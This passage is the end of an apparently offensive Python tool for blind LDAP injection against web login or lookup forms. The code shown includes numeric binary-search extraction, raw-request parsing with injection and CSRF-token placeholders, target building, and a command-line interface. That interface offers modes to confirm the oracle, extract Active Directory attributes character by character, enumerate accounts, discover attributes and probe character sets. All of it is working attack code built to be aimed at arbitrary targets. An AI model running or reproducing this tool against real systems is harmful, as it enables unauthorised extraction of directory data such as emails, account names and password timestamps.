    instead of wildcards, needing ~log2(hi-lo) oracle calls to pin the
    exact value.
    """
    if not anchor_attr or anchor_value is None:
        print("[!] --extract-numeric requires --anchor-attr and --anchor-value")
        return None
    if lo > hi:
        print(f"[!] Invalid range: --num-min {lo} > --num-max {hi}")
        return None

    state = {"token": None}
    print(f"[*] Binary-searching {attr} for {anchor_attr}={anchor_value!r} "
          f"over [{lo}, {hi}]\n")

    hi_cond = _numeric_le_condition(attr, hi, anchor_attr, anchor_value)
    hi_payload = f"*)({hi_cond})(objectClass=*"
    hi_result = _check_true(session, state, hi_payload, verify_tls, proxies, delay)
    print(f"    [sanity: {attr}<={hi}] -> {hi_result}")
    if hi_result is not True:
        print(
            f"\n[!] {attr}<={hi} did not evaluate true -- the real value is above "
            f"--num-max {hi}, the attribute doesn't support ordering comparisons, "
            f"or the anchor/oracle is off. Widen --num-max and retry, or confirm "
            f"ordering support with a manual >= / <= check first."
        )
        return None

    while lo < hi:
        mid = (lo + hi) // 2
        cond = _numeric_le_condition(attr, mid, anchor_attr, anchor_value)
        payload = f"*)({cond})(objectClass=*"
        result = _check_true(session, state, payload, verify_tls, proxies, delay)
        print(f"    [{attr}<={mid}] -> {result}  (range now "
              f"[{lo}, {mid if result else hi}] after this)" if result is not None
              else f"    [{attr}<={mid}] -> inconclusive, treating as {attr}>{mid} "
                   f"and continuing")
        if result is None:
            lo = mid + 1
        elif result:
            hi = mid
        else:
            lo = mid + 1

    print(f"\n[RESULT] {attr} = {lo}")
    return lo


def parse_raw_request(path):
    """
    Parse a raw HTTP request captured from a proxy (Burp's "Copy to file" /
    "Save item", or anything in the same request-line + headers + blank-line
    + body shape) into (method, request_path, headers, body_template).

    The body is returned completely unmodified except for CRLF
    normalization -- it's expected to already contain the injection/token
    placeholders (default {{INJECT}} / {{TOKEN}}, or whatever --inject-marker
    /--token-marker were set to) wherever the captured Email/CSRF field
    values were, since the caller has to decide themselves which field in
    the request is worth targeting.
    """
    text = open(path, "r", newline="").read().replace("\r\n", "\n")
    if "\n\n" in text:
        head, body = text.split("\n\n", 1)
    else:
        head, body = text, ""

    lines = head.split("\n")
    if not lines or not lines[0].strip():
        raise ValueError(f"{path}: empty or missing request line")

    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f"{path}: malformed request line: {lines[0]!r}")
    method, req_path = parts[0], parts[1]

    headers = {}
    for line in lines[1:]:
        if not line.strip() or ":" not in line:
            continue
        k, v = line.split(":", 1)
        if k.strip().lower() in MANAGED_HEADERS:
            continue
        headers[k.strip()] = v.strip()

    return method, req_path, headers, body


def build_target(args, error):
    """Build the module-global TARGET from either --request-file or the
    fallback --url/--path flags. `error` is p.error, used for fatal usage
    mistakes so they render as normal argparse errors."""
    inject_marker = args.inject_marker
    token_marker = args.token_marker

    if args.request_file:
        method, req_path, headers, body_template = parse_raw_request(args.request_file)
        host_key = next((k for k in headers if k.lower() == "host"), None)
        host_header = headers.pop(host_key) if host_key else None
        if args.url:
            scheme_host = args.url.rstrip("/")
        elif host_header:
            scheme_host = f"{args.scheme}://{host_header}"
        else:
            scheme_host = (args.url or input(
                "Target scheme+host, e.g. https://target.example "
                "(no Host header in request file): "
            ).strip()).rstrip("/")
        if not scheme_host:
            error("Could not determine target host: pass --url or include a "
                  "Host header in --request-file")
        url = scheme_host + req_path

        if inject_marker not in body_template and not any(
                inject_marker in v for v in headers.values()):
            error(f"--inject-marker {inject_marker!r} not found anywhere in "
                  f"--request-file; mark the vulnerable field's value with it")

        if not args.true_marker or not args.false_marker:
            error("--true-marker and --false-marker (at least one of each) are "
                  "required -- there's no built-in default, since every "
                  "target's oracle response wording is different")
        true_markers = tuple(args.true_marker)
        false_markers = tuple(args.false_marker)

        needs_token_marker = token_marker in body_template or any(
            token_marker in v for v in headers.values())
        if needs_token_marker and not args.token_regex:
            error("--request-file's body/headers contain the token marker "
                  f"{token_marker!r} but no --token-regex was given to scrape "
                  "a fresh value for it")
        token_regex = re.compile(args.token_regex) if args.token_regex else None
        token_get_url = scheme_host + (args.token_get_path or req_path)

        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")

        return Target(method, url, headers, body_template, token_marker,
                      inject_marker, token_regex, token_get_url,
                      true_markers, false_markers)

    # Fallback mode: no --request-file. Assumes a POST form with fields
    # named Email/__RequestVerificationToken (common ASP.NET MVC pattern);
    # use --request-file instead for anything that doesn't match.
    if not args.path:
        error("--path is required in fallback (no --request-file) mode, e.g. "
              "--path /path/to/vulnerable/form")
    url_base = args.url or input("Target base URL (e.g. https://target.example): ").strip()
    if not url_base:
        error("A target --url is required (or pass --request-file)")
    url_base = url_base.rstrip("/")
    url = url_base + args.path

    if not args.true_marker or not args.false_marker:
        error("--true-marker and --false-marker (at least one of each) are "
              "required -- there's no built-in default, since every target's "
              "oracle response wording is different")
    true_markers = tuple(args.true_marker)
    false_markers = tuple(args.false_marker)
    token_regex = re.compile(args.token_regex) if args.token_regex else re.compile(DEFAULT_TOKEN_REGEX)

    return Target(
        "POST", url, dict(DEFAULT_HEADERS), DEFAULT_BODY_TEMPLATE,
        token_marker, inject_marker, token_regex, url, true_markers, false_markers,
    )


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", default=None,
                    help="Target base URL, e.g. https://target.example. With "
                         "--request-file this overrides the scheme+host the "
                         "request's Host header would otherwise supply; "
                         "without it, this is the fallback full base URL "
                         "(prompted interactively if omitted either way)")
    p.add_argument("--path", default=None,
                    help="Path of the vulnerable endpoint, used only in "
                         "fallback (no --request-file) mode -- no default, "
                         "since it's entirely target-specific")
    p.add_argument("--request-file", default=None,
                    help="Path to a raw HTTP request captured from a proxy "
                         "(request line + headers + blank line + body). Mark "
                         "the vulnerable field's value with --inject-marker "
                         "and, if the target uses a rotating CSRF/antiforgery "
                         "token, that field's value with --token-marker plus "
                         "--token-regex to scrape a fresh one from each "
                         "response. This is the generic way to point the "
                         "tool at any target, not just the original one.")
    p.add_argument("--inject-marker", default="{{INJECT}}",
                    help="Placeholder in --request-file marking where the "
                         "LDAP boolean payload goes (default: {{INJECT}})")
    p.add_argument("--token-marker", default="{{TOKEN}}",
                    help="Placeholder in --request-file marking where the "
                         "rotating CSRF/antiforgery token goes (default: "
                         "{{TOKEN}}); ignored if not present anywhere in the "
                         "request file")
    p.add_argument("--token-regex", default=None,
                    help="Regex with one capture group used to scrape a "
                         "fresh token value out of each response body "
                         "(required if --request-file uses --token-marker; "
                         "in fallback mode defaults to the "
                         "__RequestVerificationToken hidden-field regex)")
    p.add_argument("--token-get-path", default=None,
                    help="Path to GET for a fresh token before the first "
                         "request (default: same path as the main request)")
    p.add_argument("--scheme", default="https",
                    help="Scheme to use with --request-file when its Host "
                         "header supplies the host but not the scheme "
                         "(default: https)")
    p.add_argument("--true-marker", action="append", default=None,
                    help="Substring identifying a TRUE oracle response "
                         "(repeatable). Required together with "
                         "--false-marker for a new target; fallback defaults "
                         "are used only if both are omitted")
    p.add_argument("--false-marker", action="append", default=None,
                    help="Substring identifying a FALSE oracle response "
                         "(repeatable, checked before --true-marker)")
    p.add_argument("--confirm", action="store_true",
                    help="Replay the two known payloads to confirm the oracle still works")
    p.add_argument("--extract", action="store_true",
                    help="Run character-by-character extraction against --attr")
    p.add_argument("--diag", action="store_true",
                    help="Diagnose whether wildcard/substring matching works on --attr, "
                         "using a value you already know is correct (--known-value)")
    p.add_argument("--known-value", default=None,
                    help="A value already known to be correct for --attr, used by --diag")
    p.add_argument("--anchor-diag", action="store_true",
                    help="Verify --anchor-attr/--anchor-value pin exactly ONE directory "
                         "entry before trusting them for correlated-attribute extraction")
    p.add_argument("--probe-attr", default="sAMAccountName",
                    help="Second attribute used by --anchor-diag to test anchor "
                         "uniqueness (default: sAMAccountName)")
    p.add_argument("--probe-char", default="a",
                    help="Character used to build the complementary probe conditions "
                         "in --anchor-diag (default: 'a')")
    p.add_argument("--enumerate", action="store_true",
                    help="Cold-start discovery: exact-equality check --attr against "
                         "externally supplied candidates (--wordlist and/or "
                         "--range-format/--range-start/--range-end), instead of "
                         "character-by-character prefix brute force")
    p.add_argument("--wordlist", default=None,
                    help="Path to a newline-delimited candidate list for --enumerate")
    p.add_argument("--range-format", default=None,
                    help="Python format string for a numeric candidate range, e.g. "
                         "'e{:04d}' (use with --range-start/--range-end)")
    p.add_argument("--range-start", type=int, default=None,
                    help="Start of numeric range for --range-format (inclusive)")
    p.add_argument("--range-end", type=int, default=None,
                    help="End of numeric range for --range-format (inclusive)")
    p.add_argument("--attr-discover", action="store_true",
                    help="Test which attributes are populated on the entry pinned by "
                         "--anchor-attr/--anchor-value via existence checks (attr=*), "
                         "instead of guessing which attributes exist")
    p.add_argument("--attr-list", default=None,
                    help="Comma-separated attribute names, or a path to a newline-"
                         "delimited file, to check with --attr-discover (default: "
                         "built-in common AD attribute list)")
    p.add_argument("--charset-probe", action="store_true",
                    help="Test whether wildcard/substring matching works at all for "
                         "--attr on the entry pinned by --anchor-attr/--anchor-value, "
                         "and which characters match, before trusting --extract's "
                         "results (or lack of them) for that attribute")
    p.add_argument("--probe-charset", default=PROBE_CHARSET,
                    help="Character set used by --charset-probe (default: broad "
                         "upper/lower/digit/punctuation superset)")
    p.add_argument("--extract-numeric", action="store_true",
                    help="Binary-search extraction via <= ordering comparisons for "
                         "Integer/LargeInteger-syntax attributes (lastLogon, "
                         "pwdLastSet, userAccountControl, ...) that --charset-probe "
                         "shows don't support wildcard matching")
    p.add_argument("--num-min", type=int, default=0,
                    help="Lower bound for --extract-numeric's search range (default: 0)")
    p.add_argument("--num-max", type=int, default=2**63 - 1,
                    help="Upper bound for --extract-numeric's search range "
                         "(default: 2**63-1, covers Windows FILETIME-range attributes)")
    p.add_argument("--attr", default="mail",
                    help="LDAP attribute name to extract (default: mail)")
    p.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz0123456789.@_-",
                    help="Characters to try at each position")
    p.add_argument("--max-len", type=int, default=40,
                    help="Max value length to extract (default: 40)")
    p.add_argument("--prefix", default="",
                    help="Known starting prefix to resume extraction from")
    p.add_argument("--max-branches", type=int, default=8,
                    help="Max candidate branches to keep per position before truncating "
                         "(default: 8; raise if you suspect truncation is dropping real entries)")
    p.add_argument("--case-insensitive", action="store_true",
                    help="Deduplicate --extract branches that differ only by case (e.g. "
                         "'m' vs 'M' both matching) before they're added to the next "
                         "frontier -- use when a warning says the attribute compares "
                         "case-insensitively and branch counts are doubling on case noise")
    p.add_argument("--anchor-attr", default=None,
                    help="Attribute to anchor extraction to a single known entry, e.g. sAMAccountName "
                         "(use together with --anchor-value; requires the anchor value be an EXACT, "
                         "already-confirmed match -- typically a unique attribute like sAMAccountName)")
    p.add_argument("--anchor-value", default=None,
                    help="Exact value of --anchor-attr identifying the entry to pull correlated "
                         "attributes from, e.g. a confirmed sAMAccountName")
    p.add_argument("--proxy", default=None,
                    help="Optional HTTP(S) proxy, e.g. http://127.0.0.1:8080 (Burp)")
    p.add_argument("--insecure", action="store_true",
                    help="Disable TLS verification (needed if routing through Burp's own cert)")
    p.add_argument("--delay", type=float, default=0.3,
                    help="Delay in seconds between requests (default: 0.3, be polite to a live target)")
    p.add_argument("--concurrency", type=int, default=1,
                    help="Number of parallel session/token lanes to use for --extract and "
                         "--enumerate (default: 1, fully serial). Each lane gets its own "
                         "cookie+token and independent --delay pacing, so raising this is "
                         "the main lever for extraction speed -- e.g. 8-10 is usually a big "
                         "win without being much louder per-lane against the target.")
    p.add_argument("--retries", type=int, default=3,
                    help="Retries per oracle check before giving up and marking a "
                         "candidate inconclusive (default: 3). Raise this well past the "
                         "default on a load-balanced target where responses are "
                         "intermittently inconsistent for identically-shaped payloads -- "
                         "each retry gets a fresh token and has an independent chance of "
                         "landing on a backend node that actually validates your session")
    p.add_argument("--dump-responses", default=None,
                    help="Directory to write every full raw response body to (one file "
                         "per request, numbered and tagged true/false/anomaly) -- for "
                         "diffing a working response against a failing one by hand when "
                         "the markers aren't explaining the target's behavior. Off by "
                         "default since a real run can be a lot of files")
    args = p.parse_args()

    if not args.confirm and not args.extract and not args.diag and not args.anchor_diag \
            and not args.enumerate and not args.attr_discover and not args.charset_probe \
            and not args.extract_numeric:
        p.error("Specify --confirm, --extract, --diag, --anchor-diag, --enumerate, "
                 "--attr-discover, --charset-probe, and/or --extract-numeric")

    if bool(args.anchor_attr) != bool(args.anchor_value is not None):
        p.error("--anchor-attr and --anchor-value must be given together")

    global TARGET, RETRIES, DUMP_DIR
    TARGET = build_target(args, p.error)
    RETRIES = args.retries
    if args.dump_responses:
        os.makedirs(args.dump_responses, exist_ok=True)
        DUMP_DIR = args.dump_responses

    verify_tls = not args.insecure
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    if args.insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    session = requests.Session()

    if args.confirm:
        ok = confirm(session, verify_tls, proxies, args.delay)
        if not ok and not args.extract:
            sys.exit(1)

    if args.diag:
        diag(session, verify_tls, proxies, args.delay, args.attr, args.known_value)

    if args.anchor_diag:
        anchor_diag(session, verify_tls, proxies, args.delay,
                    args.anchor_attr, args.anchor_value,
                    args.probe_attr, args.probe_char)

    if args.attr_discover:
        if args.attr_list:
            if os.path.isfile(args.attr_list):
                with open(args.attr_list) as f:
                    candidate_attrs = [line.strip() for line in f if line.strip()]
            else:
                candidate_attrs = [a.strip() for a in args.attr_list.split(",") if a.strip()]
        else:
            candidate_attrs = DEFAULT_ATTR_CANDIDATES
        attr_discover(session, verify_tls, proxies, args.delay,
                      args.anchor_attr, args.anchor_value, candidate_attrs)

    if args.charset_probe:
        charset_probe(session, verify_tls, proxies, args.delay,
                      args.anchor_attr, args.anchor_value, args.attr, args.probe_charset)

    if args.extract_numeric:
        extract_numeric(session, verify_tls, proxies, args.delay, args.attr,
                        args.anchor_attr, args.anchor_value, args.num_min, args.num_max)

    if args.enumerate:
        candidates = load_candidates(args.wordlist, args.range_format,
                                      args.range_start, args.range_end)
        if not candidates:
            p.error("--enumerate needs --wordlist and/or "
                     "--range-format/--range-start/--range-end to produce candidates")
        print(f"[*] Enumerating {len(candidates)} candidate(s) against attribute '{args.attr}'")
        enumerate_values(session, verify_tls, proxies, args.delay, args.attr, candidates,
                          args.concurrency)

    if args.extract:
        print(f"[*] Extracting values for attribute '{args.attr}' "
              f"(charset len={len(args.charset)}, max_len={args.max_len}, "
              f"max_branches={args.max_branches})")
        results = extract_values(session, verify_tls, proxies, args.delay,
                                  args.attr, args.charset, args.max_len,
                                  args.prefix, args.max_branches,
                                  args.anchor_attr, args.anchor_value,
                                  case_insensitive=args.case_insensitive,
                                  concurrency=args.concurrency)
        print(f"\n[RESULT] {args.attr} -> {len(results)} confirmed value(s):")
        for v in results:
            print(f"  {v!r}")


if __name__ == "__main__":
    main()
